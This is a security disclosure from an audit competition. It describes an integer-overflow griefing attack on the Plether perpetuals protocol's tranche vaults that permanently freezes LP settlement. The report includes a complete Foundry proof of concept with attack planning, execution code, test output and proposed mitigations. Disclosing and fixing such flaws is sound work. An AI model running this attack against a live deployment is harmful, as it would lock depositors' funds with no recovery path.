# \#99161 [SC-Critical] Junior share supply pumped to within 1000 of `2^256-1` makes `supply + VIRTUAL_SHARES` overflow in every `settleLpEpoch`, permanently freezing all LP settlement (untrusted actor only, weekends included)

**Submitted on Nov 12th 2026 at 08:04:17 UTC by @MangalJup for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99161
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Permanent freezing of funds

## Description

### Brief/Intro

There is no NAV-per-share floor on Junior activation. If Junior principal is at dust, a Junior deposit mints `d·(N+1000)/(J+1)` shares, and the Senior coupon then drains the deposit back to dust within a few hours. Repeating this lets an untrusted attacker grow Junior `totalSupply` by about 10^4× per cycle.

The attacker can also land the supply **exactly** in `(2^256−1−1000, 2^256−1]`. One final settle burns a 1-share-granular Junior redeem and then mints a deposit.

From that point, every `settleLpEpoch` that reaches the Junior redemption phase evaluates `supply + virtualShares` (`HousePoolRedemptionMathLib.sol:46`) for a matured Junior redeem head and panics with `0x11`. The attacker queues one such head for the next epoch before landing. Once it matures, nobody can cancel it (`TrancheVault.sol:894`), so settlement reverts forever:

- Senior redemptions are frozen.
- Senior and Junior pending deposits are frozen.
- Junior redemptions are frozen.

This happens on weekdays and during oracle-frozen weekends. No owner action is involved, and no owner action fixes it.

### Vulnerability Details

**1. Unchecked offset add on every matured Junior redeem head.**

```solidity
// HousePoolRedemptionMathLib.sol:45-46
uint256 grossAssets =
    Math.mulDiv(shares, principal + virtualAssets, supply + virtualShares, Math.Rounding.Floor);
```

```solidity
// HousePool.sol:957-959  (_fundRedemptionPhase, Junior phase entered from HousePool.sol:882)
uint256 fullHeadAssets = REDEMPTION_MATH_SIDECAR.netAssetsForShares(
    remainingShares, phase.pricingPrincipal, phase.pricingSupply, 1, 1000, feeBps
);
```

- `fullHeadAssets` is computed for the head **before** the budget check and before the zero-payout refund branch. Any matured Junior head with `pricingSupply > 2^256−1−1000` therefore reverts the whole settlement.
- The Junior redemption phase runs **before** the oracle-frozen / paused / entry gates (`HousePool.sol:903`, `:908`). That is why frozen-weekend settles revert too.
- The library NatSpec states the assumption this finding breaks (`HousePoolRedemptionMathLib.sol:7-10`): *"Canonical principal and supply are bounded protocol accounting values, so adding their configured offsets must fit `uint256`"*.
- The same add sits in `_convertToSharesUsingAssets` / `_convertToAssetsUsingAssets` (`TrancheVault.sol:1858`, `:1866`). As a result `convertToAssets`, `estimateRedeemAssets`, and `requestRedeem` (min-size check at `TrancheVault.sol:1615`) all panic as well.

**2. Supply can be pumped without bound at dust NAV.**

- `quoteDepositFromState` mints `floor(d·(pricingSupply+1000)/(pricingAssets+1))` (`TrancheVault.sol:1409`).
- Activation is deferred only when `juniorPrincipal == 0` (`HousePool.sol:917`). Any principal `≥ 1` atom is accepted.
- The Senior coupon (`HousePoolWaterfallAccountingLib.paySeniorCoupon`) moves Junior principal to Senior every second. At 751k USDG and 800 bps that is about 1905 atoms/s.
- So the attacker can settle at the last second where `J ≥ 1`. Each 20.6 USDG deposit multiplies supply by about 10^4, and the coupon drains that deposit back to dust in about 3 h.
- Settlement is permissionless when there are no open positions (`HousePool.sol:809`).

**3. Exact landing is possible at 1-share granularity.** In one settle, the Junior redemption phase burns first and the deposit phase then re-readspost-burn supply and principal (`HousePool.sol:882-887`, `:915-916`):

```
N_final = (N2 − B) + floor(d · (N2 − B + 1000) / (Jf − p + 1))
p       = floor(B · (Jf + 1) / (N2 + 1000))
```

- For fixed `p`, `N_final` moves by about 1.02 shares per unit of `B`, which is far below the 1000-share window. Some `B` always hits the window. `B` is transferred to a fresh holder who redeems all of it, so the min-size check passes because `shares == maxShares` (`TrancheVault.sol:1615`).
- The burn has to be funded, which needs Junior principal above the ratio requirement `exposure·(BPS−m)/m` (`HousePoolSeniorCapacityLib.sol:87-89`). The attacker's last pump deposit `D = required + 100 USDG` provides that.

**4. The brick head cannot be removed.**

- A redeem queued after the epoch-E cutoff lands in epoch E+1. After it matures, `cancelRedeemRequest` reverts (`currentLpEpoch() >= requestId`, `TrancheVault.sol:894`).
- No admin path removes or refunds redeem heads.
- Supply can only fall through `fundRedeemEpoch` burns, which run inside the reverting phase.

### Attack path (all untrusted)

0. **Honest precondition.** A market loss leaves Junior at dust while Senior stays at its HWM. In the PoC a SHORT wins about 300k, leaving J ≈ 120 USDG.
1. **Pump.** Repeat `requestDeposit(20.6 USDG)` and settle at the last second with `J ≥ 1`. The last cycle deposits `D = requiredJunior + 100 USDG` and lands supply at about 94-95 % of `2^256`. This takes 14 cycles and about 57 h, counting from the first deposit.
2. **Plan.** One hour later (after the cooldown), compute off-chain:
   - `Jf`, the projected Junior principal at epoch start `tf`;
   - `B` and `d` such that `N_final ∈ [2^256−1000, 2^256−1]`.
3. **Requests in epoch E (before the cutoff).**
   - `transfer(C, B)`, then `C.requestRedeem(B)`.
   - `transfer(DD, 1e60)`.
   - `ATK.requestDeposit(d)`.
4. **After the epoch-E cutoff.** `DD.requestRedeem(1e60)`. This becomes the head for epoch E+1.
5. **At `tf`.** `settleLpEpoch`: C's burn is funded, `d` is minted, and supply becomes `2^256−1−999`.
6. **From epoch E+1 onward.** Every `settleLpEpoch` reverts with `Panic(0x11)`.

## Impact Details

PoC numbers, for both the fixture config and the release config:

| | Fixture (`maxSeniorShareBps = 9999`) | Release (`maxSeniorShareBps = 8000`, `DEPLOYMENT.md:155`, set via real 72 h timelock) |
|---|---|---|
| Settle attempts over 30 days (hourly) | 720, all `Panic(0x11)` | 720, all `Panic(0x11)` |
| …of which oracle-frozen weekend | 191, all reverted | 192, all reverted |
| Senior principal frozen | **751,571 USDG** | **756,341 USDG** |
| Senior LP's 1/3 redeem funded after 30 days | 0 | 0 |
| Attacker net out of pocket | 451.4 USDG | 200,010 USDG (199,731 of it locked as Junior principal, paid to the frozen Senior as coupon over time) |
| Final supply headroom to `2^256−1` | 999 | 999 |

1. **Senior principal is frozen.** In the PoC this is the whole Senior tranche (production Senior cap is 40M). Coupon stops once J hits 0, so the principal stays constant and unreachable.
2. **Deposits and Junior exits are frozen.**
   - Any pending Senior or Junior deposit never activates.
   - Junior redemptions are frozen forever.
   - New Junior `requestRedeem` panics, as shown in the PoC.
3. **No trusted cure was found.**
   - Vaults are set-once (`HousePool.sol:272-297`).
   - The frozen LP fee cannot reach the `feeBps == BPS` early return (`HousePoolRedemptionMathLib.sol:41`), because the config caps it below that.
   - `pauseLpEpochSettlement` only stops settlement.
   - Enabling the Junior maintenance fee only adds supply.
   - Nothing removes redeem heads.
4. **Remaining escape (limits the Critical claim).** A Senior LP who splits its exit across ≥ 17 matured epochs triggers the 16-epoch Senior work cap (`HousePool.sol:869-875`). Settlement then returns before the Junior phase.
   - `test_seniorWorkCapEscape`: out of a 150,000 USDG exit split into 17 chunks, **141,200 USDG** got out. The 17th head stays queued, and the next settle panics again.
   - An informed Senior LP can repeat this (17 h per round) to exit most of a position.
   - Junior holders and depositors have no exit at all.
5. **Broken invariant:** LP settlement liveness. `HousePoolRedemptionMathLib`'s stated assumption that `supply + virtualShares` fits in `uint256` (`:7-10`) does not hold.

There is no profit motive. This is pure griefing, and the cost is set by `maxSeniorShareBps`.

### Preconditions

- **Internal:**
  - Junior principal at dust (> 0) with Junior supply > 0.
  - Senior at its HWM. Coupon-only drift also reaches this state.
  - No open positions during the pump.
  - Senior is large enough that ~3 h of coupon is ≥ 1 USDG (S ≳ 37k at 800 bps).
- **External:** an honest market loss that leaves Junior at dust.
- **Attacker capital:** about 450 USDG at m = 9999, about 200k USDG at m = 8000. The release-config capital stays locked as Junior principal.

## Proof of Concept

## Proof of Concept

The PoC is standalone and uses only the repo's `BasePerpTest` fixture: router-pranked marks, a real trader position for the honest loss, and the real 72 h timelock for the release config. It uses no `stdstore` and no mocks of in-scope contracts.

Place the file at `packages/perps/test/perps/JuniorSupplyVirtualShareOverflowBrick.t.sol` and run:

```
forge test --root packages/perps --match-path test/perps/JuniorSupplyVirtualShareOverflowBrick.t.sol -vv --gas-limit 100000000000 --disable-block-gas-limit
```

(The 30-day loop makes 720 settle attempts, which is why the gas flags are needed.)

### Output

```
JuniorSupplyOverflowFixtureTest
[PASS] test_untrustedPermanentBrick() (gas: 177654491)
  after honest loss: senior 751000132571 junior 119880523
  pump cycles 14
  supply after pump (pct of 2^256, x1e4) 9510
  plan d 8491362 payout p 1
  final junior supply headroom to 2^256-1 999
  attack wall-clock hours 57
  attacker USDG net out of pocket 451435597
  settle attempts over 30 days 720
    of which oracle-frozen weekend 191
    reverted 720
    frozen-window reverted 191
  senior principal frozen (USDG atoms) 751571448691
[PASS] test_seniorWorkCapEscape() (gas: 31702468)
  work-cap settle ok, senior vault USDG gained 141199892544

JuniorSupplyOverflowReleaseTest (maxSeniorShareBps 8000)
[PASS] test_untrustedPermanentBrick() (gas: 177652477)
  after honest loss: senior 751001657699 junior 118355395
  pump cycles 14
  plan d 11800337450 payout p 1
  final junior supply headroom to 2^256-1 999
  attacker USDG net out of pocket 200009940412
  junior principal left (attacker-owned) 199730527088
  settle attempts over 30 days 720
    of which oracle-frozen weekend 192
    reverted 720
    frozen-window reverted 192
  senior principal frozen (USDG atoms) 756340935553
[PASS] test_seniorWorkCapEscape() (gas: 31699973)
  work-cap settle ok, senior vault USDG gained 141199892544
```

### Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Untrusted-only permanent LP-settlement brick.
///         1. Honest trader win leaves Junior at dust while Senior sits at its high-water mark.
///         2. Attacker pumps Junior share supply at dust NAV (deposit at the second Junior is ~1 atom, coupon drains it).
///         3. One final settle burns an exactly sized Junior redeem (1-share granularity) and mints a deposit, landing
///            Junior supply within 1000 shares of 2^256-1.
///         4. A Junior redeem head queued for the next epoch is then priced with `supply + VIRTUAL_SHARES` in every
///            `settleLpEpoch` -> Panic(0x11) forever (weekdays and oracle-frozen weekends alike).
abstract contract JuniorSupplyOverflowBase is BasePerpTest {

    uint256 internal constant MAX = type(uint256).max;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant PUMP_DEPOSIT = 20_600_000; // ~3h of Senior coupon at 751k USDG / 800 bps
    uint256 internal constant WIPE_CLOSE_PRICE = 1.7522e8;

    address internal constant ATK = address(0xA77AC);
    address internal constant C = address(0xC0C0);
    address internal constant DD = address(0xDDDD);
    address internal constant SB = address(0x5E1); // honest Senior LP
    address internal constant TRADER = address(0x7AADE);

    bytes internal constant PANIC_OVERFLOW = abi.encodeWithSignature("Panic(uint256)", 0x11);

    uint256 internal attackerSpent;
    uint256 internal attackStart;
    uint256 internal brickEpoch;
    uint256 internal tf;

    struct Plan {
        uint256 b;
        uint256 d;
        uint256 p;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 300_000e6;
    }

    // ------------------------------------------------------------------ helpers

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _jAt(
        uint256 t
    ) internal returns (uint256 j) {
        uint256 saved = _now();
        vm.warp(t);
        (, j) = pool.getPendingDepositTrancheState();
        vm.warp(saved);
    }

    /// @dev Last second >= lo at which projected Junior principal is still >= x (J only decays with time here).
    function _lastSecondWithJ(
        uint256 lo,
        uint256 x
    ) internal returns (uint256) {
        require(_jAt(lo) >= x, "J below target at epoch start");
        uint256 hi = lo + 3 days;
        require(_jAt(hi) < x, "J never decays below target");
        while (hi - lo > 1) {
            uint256 mid = (lo + hi) / 2;
            if (_jAt(mid) >= x) {
                lo = mid;
            } else {
                hi = mid;
            }
        }
        return lo;
    }

    function _requiredJunior() internal view returns (uint256) {
        (uint256 s,) = pool.getPendingDepositTrancheState();
        uint256 m = pool.maxSeniorShareBps();
        return Math.mulDiv(s, BPS - m, m, Math.Rounding.Ceil);
    }

    function _attackerDeposit(
        uint256 assets
    ) internal returns (uint256 rid) {
        settlementToken.mint(ATK, assets);
        attackerSpent += assets;
        vm.startPrank(ATK);
        settlementToken.approve(address(juniorVault), assets);
        rid = juniorVault.requestDeposit(assets, ATK, ATK);
        vm.stopPrank();
    }

    function _settleAt(
        uint256 t
    ) internal {
        vm.warp(t);
        assertFalse(engine.isOracleFrozen(), "pump settles run on weekdays");
        pool.settleLpEpoch(0, 0);
    }

    function _claim(
        uint256 rid,
        uint256 assets
    ) internal {
        vm.prank(ATK);
        juniorVault.claimDeposit(rid, assets, ATK, ATK);
    }

    // ------------------------------------------------------------------ steps

    /// @dev Honest market loss: a SHORT wins ~300k, Junior absorbs it and keeps ~120 USDG. Senior untouched (== HWM).
    function _wipeToDust() internal {
        _fundSenior(SB, 750_000e6);
        _fundTrader(TRADER, 50_000e6);
        _open(TRADER, CfdTypes.Side.SHORT, 400_000e18, 20_000e6, 1e8);
        vm.warp(_now() + 60);
        _close(TRADER, CfdTypes.Side.SHORT, 400_000e18, WIPE_CLOSE_PRICE);

        (uint256 s, uint256 j) = pool.getPendingDepositTrancheState();
        console2.log("after honest loss: senior", s, "junior", j);
        assertGt(j, 0, "junior not wiped to zero");
        assertLt(j, 1000e6, "junior at dust");
        assertEq(engine.terminalNavSnapshot().hasOpenPositions, false, "quiet pool");
    }

    /// @dev Supply pump. Each cycle: request a Junior deposit, settle at the last second Junior principal is > 0.
    ///      Ends with a large deposit D >= requiredJunior + 100 USDG that lands supply at ~98% of 2^256.
    function _pump() internal returns (uint256 cycles, uint256 activation) {
        attackStart = _now();
        uint256 target = MAX / 100 * 98;
        while (true) {
            // Required Junior grows with the Senior coupon, so size the final deposit at the time it is made.
            uint256 bigD = _requiredJunior() + 100e6;

            uint256 softCap = Math.mulDiv(target, 1e6, bigD); // supply at which the final cycle prices J ~= 1 USDG
            cycles++;
            require(cycles < 40, "pump did not converge");
            uint256 n = juniorVault.totalSupply();
            (uint256 rid,) = juniorVault.getRequestEpochWindow();
            uint256 es = pool.lpEpochStart(rid);
            uint256 jEs = _jAt(es);
            uint256 tDust = _lastSecondWithJ(es, 1);
            uint256 jDust = _jAt(tDust);

            // J at which the big deposit mints exactly (target - n) shares.
            uint256 jxFinal = Math.mulDiv(bigD, n + 1000, target - n);
            if (jxFinal >= jDust + 1 && jxFinal <= jEs) {
                _attackerDeposit(bigD);
                uint256 t = _lastSecondWithJ(es, jxFinal);
                _settleAt(t);
                _claim(rid, bigD);
                activation = t;
                break;
            }
            require(jxFinal < jDust + 1, "supply overshot");

            // Normal pump cycle. Cap growth so the final cycle stays reachable.
            uint256 t2 = tDust;
            uint256 grown = n + Math.mulDiv(PUMP_DEPOSIT, n + 1000, jDust + 1);
            if (grown > softCap) {
                uint256 jy = Math.mulDiv(PUMP_DEPOSIT, n + 1000, softCap - n);
                t2 = _lastSecondWithJ(es, jy);
            }
            _attackerDeposit(PUMP_DEPOSIT);
            _settleAt(t2);
            _claim(rid, PUMP_DEPOSIT);
        }
    }

    function _mintAt(
        uint256 m,
        uint256 d,
        uint256 jAfter
    ) internal pure returns (bool fits, uint256 total) {
        uint256 minted = Math.mulDiv(d, m + 1000, jAfter + 1);
        if (minted > MAX - m) {
            return (false, 0);
        }
        return (true, m + minted);
    }

    /// @dev Off-chain planning (pure arithmetic on public state): choose redeem burn B and deposit d so that
    ///      supply after `burn B; mint floor(d*(N2-B+1000)/(Jf-p+1))` lands in [MAX-999, MAX].
    function _plan(
        uint256 n2,
        uint256 jf,
        uint256 budget
    ) internal pure returns (Plan memory pl) {
        for (uint256 p = 1; p <= 400 && p <= budget; p++) {
            uint256 jAfter = jf - p;
            uint256 bMin = Math.mulDiv(p, n2 + 1000, jf + 1, Math.Rounding.Ceil);
            uint256 bMax = Math.mulDiv(p + 1, n2 + 1000, jf + 1, Math.Rounding.Ceil) - 1;
            if (bMax >= n2) {
                break;
            }
            uint256 mLo = n2 - bMax;
            uint256 mHi = n2 - bMin;
            uint256 d0 = Math.mulDiv(MAX - mHi, jAfter + 1, mHi);
            for (uint256 k = 0; k < 8; k++) {
                uint256 d = d0 + k;
                if (d < 1e6 || d < 3) {
                    continue;
                }
                d -= 3;
                // smallest m in [mLo, mHi] whose post-mint supply >= MAX - 999
                (bool okHi, uint256 fHi) = _mintAt(mHi, d, jAfter);
                if (okHi && fHi < MAX - 999) {
                    continue;
                }
                uint256 lo = mLo;
                uint256 hi = mHi;
                (bool okLo, uint256 fLo) = _mintAt(lo, d, jAfter);
                if (!okLo || fLo >= MAX - 999) {
                    continue;
                }
                while (hi - lo > 1) {
                    uint256 mid = lo + (hi - lo) / 2;
                    (bool ok, uint256 f) = _mintAt(mid, d, jAfter);
                    if (ok && f < MAX - 999) {
                        lo = mid;
                    } else {
                        hi = mid;
                    }
                }
                (bool okM, uint256 fM) = _mintAt(hi, d, jAfter);
                if (okM && fM >= MAX - 999) {
                    pl.b = n2 - hi;
                    pl.d = d;
                    pl.p = p;
                    return pl;
                }
            }
        }
        revert("no plan");
    }

    function _runAttack() internal returns (uint256 seniorAtBrick) {
        _wipeToDust();
        (uint256 cycles, uint256 activation) = _pump();
        console2.log("pump cycles", cycles);
        console2.log("supply after pump (pct of 2^256, x1e4)", juniorVault.totalSupply() / (MAX / 10_000));

        // Cooldown after the last claimed activation, and stay before the request cutoff.
        vm.warp(activation + 1 hours);
        (uint256 e, uint256 cutoff) = juniorVault.getRequestEpochWindow();
        if (_now() + 10 minutes > cutoff) {
            vm.warp(pool.lpEpochStart(e));
            (e, cutoff) = juniorVault.getRequestEpochWindow();
        }
        tf = pool.lpEpochStart(e);
        brickEpoch = e + 1;

        uint256 n2 = juniorVault.totalSupply();
        uint256 jf = _jAt(tf);
        uint256 budget = jf - _requiredJunior() - 10e6; // keep margin under the Junior ratio cap
        Plan memory pl = _plan(n2, jf, budget);
        console2.log("plan B", pl.b);
        console2.log("plan d", pl.d, "payout p", pl.p);

        vm.startPrank(ATK);
        juniorVault.transfer(C, pl.b);
        juniorVault.transfer(DD, 1e60);
        vm.stopPrank();

        vm.prank(C);
        assertEq(juniorVault.requestRedeem(pl.b, C, C), e, "fine-tune burn in epoch E");
        assertEq(_attackerDeposit(pl.d), e, "final mint in epoch E");

        vm.warp(cutoff + 1); // after the epoch-E cutoff -> brick head goes to E+1
        vm.prank(DD);
        assertEq(juniorVault.requestRedeem(1e60, DD, DD), brickEpoch, "brick head in epoch E+1");

        _settleAt(tf);
        uint256 supply = juniorVault.totalSupply();
        console2.log("final junior supply headroom to 2^256-1", MAX - supply);
        assertGt(supply, MAX - 1000, "supply + VIRTUAL_SHARES overflows");

        uint256 cPaid = juniorVault.claimableRedeemAssets(e, C);
        console2.log("burn holder C payout (USDG atoms)", cPaid);
        console2.log("attack wall-clock hours", (_now() - attackStart) / 1 hours);
        console2.log("attacker USDG net out of pocket", attackerSpent - cPaid);
        (uint256 s, uint256 j) = pool.getPendingDepositTrancheState();
        console2.log("junior principal left (attacker-owned)", j);
        seniorAtBrick = s;
    }

    // ------------------------------------------------------------------ tests

    function test_untrustedPermanentBrick() public {
        uint256 seniorAtBrick = _runAttack();

        // Honest Senior LP asks for 1/3 of its position after the brick.
        uint256 sbShares = seniorVault.balanceOf(SB);
        vm.warp(tf + 10 minutes);
        vm.prank(SB);
        uint256 sbReq = seniorVault.requestRedeem(sbShares / 3, SB, SB);

        uint256 attempts;
        uint256 reverted;
        uint256 frozen;
        uint256 frozenReverted;
        for (uint256 i = 1; i <= 720; i++) {
            vm.warp(pool.lpEpochStart(brickEpoch) + (i - 1) * 1 hours + 7 minutes);
            bool isFrozen = engine.isOracleFrozen();
            attempts++;
            if (isFrozen) frozen++;
            (bool ok, bytes memory ret) = address(pool).call(abi.encodeCall(pool.settleLpEpoch, (0, 0)));
            if (!ok) {
                assertEq(ret, PANIC_OVERFLOW, "every settle panics on supply + VIRTUAL_SHARES");
                reverted++;
                if (isFrozen) frozenReverted++;
            }
        }
        console2.log("settle attempts over 30 days", attempts);
        console2.log("  of which oracle-frozen weekend", frozen);
        console2.log("  reverted", reverted);
        console2.log("  frozen-window reverted", frozenReverted);
        assertEq(reverted, attempts, "settlement permanently bricked");
        assertGt(frozenReverted, 0, "weekend settles revert too");

        assertEq(seniorVault.claimableRedeemRequest(sbReq, SB), 0, "senior 1/3 redeem never funded");
        (uint256 s,) = pool.getPendingDepositTrancheState();
        console2.log("senior principal frozen (USDG atoms)", s);
        assertGe(s, seniorAtBrick, "senior principal stuck in pool");

        // New Junior redeem requests revert (min-size check -> convertToAssets uses supply + VIRTUAL_SHARES).
        vm.prank(ATK);
        (bool okReq, bytes memory r2) = address(juniorVault).call(abi.encodeCall(TrancheVault.requestRedeem, (1e60, ATK, ATK)));
        assertFalse(okReq);
        assertEq(r2, PANIC_OVERFLOW, "new junior redeem request panics");

        // The matured brick head cannot be cancelled.
        vm.prank(DD);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        juniorVault.cancelRedeemRequest(brickEpoch, DD, DD);
    }

    /// @dev Limits the Critical claim: an informed Senior LP that splits its exit over >= 17 matured epochs makes the
    ///      Senior phase hit the 16-epoch work cap, which returns before the Junior phase.
    function test_seniorWorkCapEscape() public {
        _runAttack();
        uint256 chunk = seniorVault.convertToShares(150_000e6) / 17;
        vm.warp(tf + 10 minutes);
        for (uint256 i; i < 17; i++) {
            vm.prank(SB);
            seniorVault.requestRedeem(chunk, SB, SB);
            vm.warp(_now() + 1 hours);
        }
        uint256 before = settlementToken.balanceOf(address(seniorVault));
        vm.warp(_now() + 1 hours);
        pool.settleLpEpoch(0, 0);
        uint256 gained = settlementToken.balanceOf(address(seniorVault)) - before;
        console2.log("work-cap settle ok, senior vault USDG gained", gained);
        assertGt(gained, 0);

        // The 17th head is left; the next settle reaches the Junior phase again and panics.
        vm.warp(_now() + 1 hours);
        (bool ok, bytes memory ret) = address(pool).call(abi.encodeCall(pool.settleLpEpoch, (0, 0)));
        assertFalse(ok);
        assertEq(ret, PANIC_OVERFLOW);
    }

}

/// @notice Fixture config (maxSeniorShareBps = 9999).
contract JuniorSupplyOverflowFixtureTest is JuniorSupplyOverflowBase {}

/// @notice Release config: maxSeniorShareBps = 8000 (DEPLOYMENT.md), set through the real 72h pool-config timelock.
contract JuniorSupplyOverflowReleaseTest is JuniorSupplyOverflowBase {

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(TEST_MAX_SENIOR_EXPOSURE_ASSETS, 8000);
        vm.warp(SETUP_TIMESTAMP + 7 days); // next Monday 10:00 UTC
        assertEq(pool.maxSeniorShareBps(), 8000);
    }

}
```

## Mitigation

1. **Fix the root cause.** Add a NAV-per-share floor for Junior activation and admission: defer or reject the deposit epoch when `juniorPrincipal * K < supply + VIRTUAL_SHARES`. This keeps supply far from `2^256`.
2. **Defence in depth:**
   - Cap every mint so that `totalSupply + shares + VIRTUAL_SHARES <= type(uint256).max`. An over-cap epoch can be rejected through the existing `shares == 0` branch (`HousePool.sol` `_settleDepositPhase`).
   - Compute `supply + virtualShares` with saturation in `HousePoolRedemptionMathLib` and in the `TrancheVault` conversions.
   - Price redeem heads inside a guarded path that refunds or skips the head instead of reverting the whole settlement.

## References

- `packages/perps/src/libraries/HousePoolRedemptionMathLib.sol:7-10`: the assumption that is broken
- `packages/perps/src/libraries/HousePoolRedemptionMathLib.sol:45-46`: the overflowing add
- `packages/perps/src/HousePool.sol:957-959`: head priced before budget/refund branches
- `packages/perps/src/HousePool.sol:882`, `:903`, `:908`: Junior phase runs before the paused/frozen gates
- `packages/perps/src/HousePool.sol:869-875`: Senior work-cap early return (the partial escape)
- `packages/perps/src/HousePool.sol:915-917`: deposit phase re-reads post-burn state; activation deferred only at `J == 0`
- `packages/perps/src/TrancheVault.sol:1409`: deposit share quote at dust NAV
- `packages/perps/src/TrancheVault.sol:1858`, `:1866`: same add in the ERC-4626 conversions
- `packages/perps/src/TrancheVault.sol:1615`: `requestRedeem` min-size check, which reaches the conversion
- `packages/perps/src/TrancheVault.sol:894`: matured redeem head cannot be cancelled
- `packages/perps/DEPLOYMENT.md:155`: release `maxSeniorShareBps = 8000`
